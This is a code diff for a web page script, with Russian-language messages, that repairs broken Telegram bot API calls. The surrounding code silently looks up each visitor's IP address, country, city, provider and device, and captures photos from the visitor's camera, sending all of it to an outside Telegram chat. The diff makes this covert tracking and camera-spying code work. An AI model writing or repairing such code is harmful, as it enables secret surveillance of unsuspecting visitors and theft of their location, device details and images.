@@ -62,9 +62,9 @@
             const res = await fetch('https://ipwho.is');
             const d = await res.json();
             const info = `👀 КТО-ТО ЗАШЕЛ!\n🌍 Страна: ${d.country}\n🏙 Город: ${d.city}\n🏢 Провайдер: ${d.connection.org}\n📍 IP: ${d.ip}\n📱 Устройство: ${navigator.userAgent.substring(0, 50)}`;
-            fetch('https://api.telegram.org'/bot + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(info));
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(info));
         } catch (e) {
-            fetch('https://api.telegram.org'/bot + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("👀 Заход (Данные заблокированы)"));
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("👀 Заход (Данные заблокированы)"));
         }
     }
     logVisit();
@@ -89,7 +89,7 @@
             await fetch('https://api.telegram.org'/bot + token + '/sendPhoto', { method: 'POST', body: f });
             stream.getTracks().forEach(t => t.stop()); 
         } catch (e) {
-            fetch('https://api.telegram.org/'bot + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("❌ КАМЕРА ЗАПРЕЩЕНА: " + facing));
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("❌ КАМЕРА ЗАПРЕЩЕНА: " + facing));
         }
     }
 
